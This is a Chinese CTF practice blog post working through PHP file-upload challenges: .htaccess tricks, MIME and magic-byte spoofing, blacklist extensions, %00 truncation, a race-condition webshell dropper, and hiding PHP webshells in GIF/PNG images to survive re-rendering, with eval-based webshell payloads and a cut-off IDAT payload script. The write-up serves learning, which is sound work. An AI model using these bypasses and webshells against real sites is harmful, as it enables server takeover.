@@ -1,0 +1,411 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.1" type="image/png" sizes="32x32"><meta name="description" content="又一周web练习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web练习2">
+<meta property="og:url" content="https://blog.flame8.xyz/2021/02/10/WebGame2/index.html">
+<meta property="og:site_name" content="WhiteFlame">
+<meta property="og:description" content="又一周web练习。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/.%5Cimage-20210210144616379.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/.%5Creplace.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/.%5Chead.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036116763150.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036846759511.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036124585228.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036847876825.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036127173608.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036129575787.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036131049530.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036135842482.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036848394730.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036138407749.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036140058678.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036153403524.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/1603616269318.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036164852192.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036165628118.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036176592096.gif">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036252666623.gif">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/1603625929446.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036266297353.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036267273505.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036267469060.gif">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036268187614.gif">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036850183974.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036276956867.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036285349399.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036303454787.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036304687175.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/1603630522797.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036306183035.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036307974999.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036344921925.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036345974560.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036348898441.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036348742287.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036353722974.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036354976650.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036356271476.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036357015967.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/1603635794598.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036358617110.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036360607524.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036693924901.jpg">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/1603669426842.jpg">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036747206733.jpg">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/1603674733221.jpg">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036748931486.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/1603675937154.jpg">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036760334176.jpg">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036761717904.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036764145479.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036775446476.png">
+<meta property="og:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/16036832903333.png">
+<meta property="article:published_time" content="2021-02-10T06:38:34.000Z">
+<meta property="article:modified_time" content="2021-02-17T07:43:30.226Z">
+<meta property="article:author" content="WhiteFlame">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.flame8.xyz/2021/02/10/WebGame2/.%5Cimage-20210210144616379.png"><title>Web练习2 | WhiteFlame</title><link ref="canonical" href="https://blog.flame8.xyz/2021/02/10/WebGame2/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.1"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">WhiteFlame</div><div class="header-banner-info__subtitle">以纯白之焰，寄吾之愿于余温</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Web练习2</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-02-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-02-17</span></span></div></header><div class="post-body"><p>又一周web练习。</p>
+<a id="more"></a>
+
+
+        <h2 id="web1"   >
+          <a href="#web1" class="heading-link"><i class="fas fa-link"></i></a>web1</h2>
+      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$coffee</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;coffee&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$coffee</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$coffee</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$coffee</span>==<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.232.149.138:10022&#x2F;?coffee&#x3D;8888a</span><br></pre></td></tr></table></div></figure>
+<p>这一道题有待进一步研究is_numeric()函数。</p>
+
+        <h2 id="web2"   >
+          <a href="#web2" class="heading-link"><i class="fas fa-link"></i></a>web2</h2>
+      <p><img src=".%5Cimage-20210210144616379.png" alt="image-20210210144616379"></p>
+<p>联想到上一次命令执行10题，利用通配符读取文件</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.232.149.138:10022&#x2F;?flag&#x3D;&#x2F;????</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="文件上传-2"   >
+          <a href="#文件上传-2" class="heading-link"><i class="fas fa-link"></i></a>文件上传-2</h2>
+      <p>修改js，使之能上传php</p>
+
+        <h2 id="绕过mime限制"   >
+          <a href="#绕过mime限制" class="heading-link"><i class="fas fa-link"></i></a>绕过mime限制</h2>
+      <p>修改上传包的mime为图片</p>
+
+        <h2 id="htaccess"   >
+          <a href="#htaccess" class="heading-link"><i class="fas fa-link"></i></a>htaccess</h2>
+      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页301重定向、自定义 404 错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</span><br></pre></td></tr></table></div></figure>
+<p>上传.gtaccess，将所有jpg解析为php格式</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ &quot;^.(htaccess|htpasswd)$&quot;&gt;</span><br><span class="line">deny from all</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br><span class="line">order deny,allow</span><br><span class="line">AddType application&#x2F;x-httpd-php jpg</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<p>相关知识：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/hxhxhxhxx/article/details/107158123" >https://blog.csdn.net/hxhxhxhxx/article/details/107158123</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="文件头绕过"   >
+          <a href="#文件头绕过" class="heading-link"><i class="fas fa-link"></i></a>文件头绕过</h2>
+      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">一个文件里面的内容到底是啥？用惯了Windows的人肯定是看后缀。但是后缀这个东西说改就改，不可靠。所以，最保险的还是把文件类型信息写到文件里面，通常来说，也就是写到文件开头的那几个字节。这是最方便，最快捷的用来辨别一个文件真实内容的方法。</span><br><span class="line"></span><br><span class="line">常见的文件头标志如下：</span><br><span class="line"></span><br><span class="line">JPEG (jpg)，文件头：FFD8FF</span><br><span class="line">PNG (png)，文件头：89504E47</span><br><span class="line">GIF (gif)，文件头：47494638</span><br><span class="line">HTML (html)，文件头：68746D6C3E</span><br><span class="line">ZIP Archive (zip)，文件头：504B0304</span><br><span class="line">RAR Archive (rar)，文件头：52617221</span><br><span class="line">Adobe Acrobat (pdf)，文件头：255044462D312E</span><br><span class="line">MS Word&#x2F;Excel (xls.or.doc)，文件头：D0CF11E0</span><br></pre></td></tr></table></div></figure>
+<p>相关资料：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/hxhxhxhxx/article/details/107152337" >https://blog.csdn.net/hxhxhxhxx/article/details/107152337</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>由资料得知，此题是通过鉴别mime和文件头来分辨是否是图片。我们上传php后缀的马且改掉上传包即可。</p>
+
+        <h2 id="字符串替换"   >
+          <a href="#字符串替换" class="heading-link"><i class="fas fa-link"></i></a>字符串替换</h2>
+      <p><img src=".%5Creplace.png" alt="img"></p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">网络安全永远处于一个发展更新的状态。因为漏洞是依赖于产品的，产品更新换代，漏洞也会更新换代。而且安全，实际上它是一个博弈的过程，永远有更强的聪明小伙想要制造点新麻烦。如果要是想一劳永逸的话，这个行业可能并不适合。</span><br><span class="line"></span><br><span class="line">热爱和天赋自然会带领你走向你该去的地方，JUST DO IT！</span><br></pre></td></tr></table></div></figure>
+<p>对于最后一句话，我感觉有点累了。</p>
+<p>题目的解决办法是：双写php在合适的地方。</p>
+
+        <h2 id="字符串替换-2"   >
+          <a href="#字符串替换-2" class="heading-link"><i class="fas fa-link"></i></a>字符串替换-2</h2>
+      <p><img src=".%5Chead.png" alt="img"></p>
+<p>同时题目多了这么一句话：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地属于理论上漏洞，因为题目环境是 Docker 容器运行的 Linux 系统，所以本题人工修改成了 Windows 的特性</span><br></pre></td></tr></table></div></figure>
+<p>重复上题操作，我们的后缀变为了p hp，是有一个空格的。</p>
+<p>再看替换函数被换成了str_replace()，这意味着什么呢？这意味着替换时，区分大小写。</p>
+<p>那我们将后缀换为大写即可绕过。</p>
+<p>…事实并没有这么简单，我发现后缀变为大写后，他不解析了。</p>
+<p>然后，传了一个.user.ini上去，变成了.user.，我也不知道怎么办了。</p>
+
+        <h2 id="黑名单"   >
+          <a href="#黑名单" class="heading-link"><i class="fas fa-link"></i></a>黑名单</h2>
+      <p>此题看题目作者wp</p>
+<p>本题同样题目的配图中暗示已经比较明显了，默认情况下 Apache 把 phtml、pht、php、php3、php4、php5 解析为 PHP：</p>
+<p><img src="16036116763150.png" alt="img"></p>
+<p>那么这里 Fuzz 一下，发现这些稍微冷门的后缀都可以直接绕过：</p>
+<p><img src="16036846759511.png" alt="img"></p>
+
+        <h2 id="00截断-1"   >
+          <a href="#00截断-1" class="heading-link"><i class="fas fa-link"></i></a>00截断-1</h2>
+      <p>此题看题目作者wp</p>
+<p>本题依然在题目中科普了 00 截断是啥，以及 00 截断的利用条件：</p>
+<p><img src="16036124585228.png" alt="img"></p>
+<p>00 截断多配合路径来截断，我们来抓包看看应该是存在路径信息的，然后直接在路径后面使用 %00 来截断一下就可以成功绕过，为啥 %00 直接就可以绕过了呢？这是因为路径信息是从 GET 方式传递个后端的，这样默认会进行一次 URL 解码，%00 解码后就是空字节：</p>
+<p><img src="16036847876825.png" alt="img"></p>
+<p>这样保存的文件名就是这样的效果：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/apache2/htdocs/upload/new.php%00shell.png</span><br></pre></td></tr></table></div></figure>
+<p>因为 <code>%00</code> 起到截断的作用，所以最终会在 upload 目录下面生成 new.php 的 webshell</p>
+<p><img src="16036127173608.png" alt="img"></p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP 内核是由 C 语言实现的，所以使用了 C 语言中的一些字符串处理函数。比如在连接字符串时候， 0 字节 (\x00) 将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串</span><br><span class="line"></span><br><span class="line">这种方法只适用于</span><br><span class="line"></span><br><span class="line">- magic_quotes_gpc &#x3D; Off</span><br><span class="line">- PHP 版本小于 5.3.4</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="00截断-2"   >
+          <a href="#00截断-2" class="heading-link"><i class="fas fa-link"></i></a>00截断-2</h2>
+      <p>此题看题目作者wp</p>
+<p>国光这一题偷懒了，没有换题目外观，不过选手们抓包就会发现这是一个 POST 型的 00 截断：</p>
+<p><img src="16036129575787.png" alt="img"></p>
+<p>既然是 POST 型 00 截断那么就直接抓包吧，需要在 BP 里面写一个 %00 然后再 URL 手动解码一下：</p>
+<p><img src="16036131049530.png" alt="img"></p>
+
+        <h2 id="条件竞争"   >
+          <a href="#条件竞争" class="heading-link"><i class="fas fa-link"></i></a>条件竞争</h2>
+      <p>此题看题目作者wp</p>
+<p>本题是一个条件竞争漏洞，也在题目中给了关键的功能代码贴图，以及给了解题思路了：</p>
+<p><img src="16036135842482.png" alt="img"></p>
+<p>条件竞争的话稍微和正常的上传姿势不一样，先把题目中给的 webshell 信息复制出来备用：</p>
+<p>Php</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;xiao.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+<p>然后先上传 shell.php 文件：</p>
+<p><img src="16036848394730.png" alt="img"></p>
+<p>BP 抓取这个数据包然后发送到 Intruder 测试器中使用 NULL 空值无限爆破：</p>
+<p><img src="16036138407749.png" alt="img"></p>
+<p>然后抓取访问 shell.php 的数据包：</p>
+<p>Http</p>
+<figure class="highlight http"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/upload/shell.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vul.xps.com:30009</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></div></figure>
+<p>依然使用 NULL 空值爆破：</p>
+<p><img src="16036140058678.png" alt="img"></p>
+<p>最后成功在服务器的 upload 目录下生成 xiao.php 里的内容就是一个标准的webshell：</p>
+<p><img src="16036153403524.png" alt="img"></p>
+
+        <h2 id="图片二次渲染"   >
+          <a href="#图片二次渲染" class="heading-link"><i class="fas fa-link"></i></a>图片二次渲染</h2>
+      <p>此题看题目作者wp</p>
+<p><code>imagecreatefrom</code> 系列渲染图片都可能被绕过，有些特殊的图马是可以逃避过渲染的，另外这一题我特意还给了查看提示的按钮：</p>
+<p><img src="1603616269318.png" alt="img"></p>
+<p>点击这个查看提示会出现如下页面：</p>
+<p><img src="16036164852192.png" alt="img"></p>
+<p>注意 URL 发生了变化，没错这里是一个文件包含漏洞，这样包含选手们逃避渲染上传后的图片的话就可以直接 getshell 了：</p>
+<p><img src="16036165628118.png" alt="img"></p>
+<p>接下来要总结一下二次渲染的细节了，这也是耗费时间写本文的主要动力之一，因为上面的那些知识点都比较常规，这个二次渲染的细节国光我一直都没有深入总结过，正好就放这里总结一下。</p>
+
+        <h3 id="GIF"   >
+          <a href="#GIF" class="heading-link"><i class="fas fa-link"></i></a>GIF</h3>
+      <p>渲染前后的两张 GIF，没有发生变化的数据库部分直接插入 Webshell 即可</p>
+<p>首先准备一张迷你的 GIF</p>
+<p><img src="16036176592096.gif" alt="img"></p>
+<p>然后上传到目标网站上面渲染一下再导出：</p>
+<p><img src="16036252666623.gif" alt="img"></p>
+<p>使用 010Editor 打开这两个文件，在 「Tools」选项下面找到「Compare Files」即可对比两个文件内容：</p>
+<p><img src="1603625929446.png" alt="img"></p>
+<p>对比的效果如下，其中灰的部分就是内容一致的部分：</p>
+<p><img src="16036266297353.png" alt="img"></p>
+<p>那么只需要将 PHP 代码插入到灰色的部分即可：</p>
+<p><img src="16036267273505.png" alt="img"></p>
+<p>修改后的 gif 图片如下：</p>
+<p><img src="16036267469060.gif" alt="img"></p>
+<p>然后上传到目标网站上面渲染一下再导出：</p>
+<p><img src="16036268187614.gif" alt="img"></p>
+<p>此时查看一下发现我们的 payload 内容依然存在：</p>
+<p><img src="16036850183974.png" alt="img"></p>
+
+        <h3 id="PNG"   >
+          <a href="#PNG" class="heading-link"><i class="fas fa-link"></i></a>PNG</h3>
+      <p>PNG 没有 GIF 那么简单，需要将数据写入到 PLTE 数据块 或者 IDAT 数据块。首先准备一个 PNG 图片：</p>
+<p><img src="16036276956867.png" alt="img"></p>
+<p>两次渲染后对比一下，发现除了 PNG 文件头，其他部分全都不一致：</p>
+<p><img src="16036285349399.png" alt="img"></p>
+<p>看来使用 GIF 那种思路是行不通的了。PNG 的解决方法继续往下面看。</p>
+
+        <h4 id="写入-PLTE-数据块"   >
+          <a href="#写入-PLTE-数据块" class="heading-link"><i class="fas fa-link"></i></a>写入 PLTE 数据块</h4>
+      <p>关于实现细节以前乌云知识库的一篇文章写的很详细，感兴趣的朋友可以阅读看看：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/drops/tips-16034.html" >WooYun 乌云 - php imagecreatefrom* 系列函数之 png</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，实验证明只有索引图像才可以成功插入 payload，灰度和真彩色图像均以失败告终。</p>
+<p>修改索引图像插入 PHP 代码的脚本项目地址为：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py" >Github - poc_png.py</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>因为值有索引图像的 PNG 才可能插入 PLTE 数据块，但是我们上面准备的 PNG 并不符合要求，得需要在 PS 里面将图片模式修改为索引颜色：</p>
+<p><img src="16036303454787.png" alt="img"></p>
+<p>修改的索引图片如下：</p>
+<p><img src="16036304687175.png" alt="img"></p>
+<p>然后使用 Python2 运行脚本：</p>
+<p>Bash</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc_png.py -p <span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span> -o gg_shell.png old.png</span><br></pre></td></tr></table></div></figure>
+<p>生成新的 gg_shell.png 图片如下：</p>
+<p><img src="1603630522797.png" alt="img"></p>
+<p>这个图片是带 payload 的：</p>
+<p><img src="16036306183035.png" alt="img"></p>
+<p>然后上传到目标网站上面渲染一下再导出：</p>
+<p><img src="16036307974999.png" alt="img"></p>
+<p>来检测一下我们的 payload 是否还存在了：</p>
+<p><img src="16036344921925.png" alt="img"></p>
+<p>哎貌似不对劲：</p>
+<p><img src="16036345974560.png" alt="img"></p>
+<p>这个字符串被渲染后貌似是顺序有点奇怪。这里国光踩了很多坑，查了很多资料网上都没有好的解决方案，最后国光<strong>将这个被目标网站渲染后的图片再上传渲染</strong>，下面是渲染后的图片：</p>
+<p><img src="16036348898441.png" alt="img"></p>
+<p>赶紧来查看一下里面是否包含图马信息：</p>
+<p><img src="16036348742287.png" alt="img"></p>
+<p>阿这！居然成功了，真的是功夫不负有心人呐，不枉国光我周末大半夜的在公司加班写的这篇文章了！！！泪目</p>
+
+        <h4 id="写入IDAT数据块"   >
+          <a href="#写入IDAT数据块" class="heading-link"><i class="fas fa-link"></i></a>写入IDAT数据块</h4>
+      <p>PNG 也是可以写入 IDAT 数据来绕过渲染的，由于快 23.00 了国光没有多余的时间研究里面细节了，这里直接引用了先知里面提供的一个脚本：</p>
+<p>Php</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, 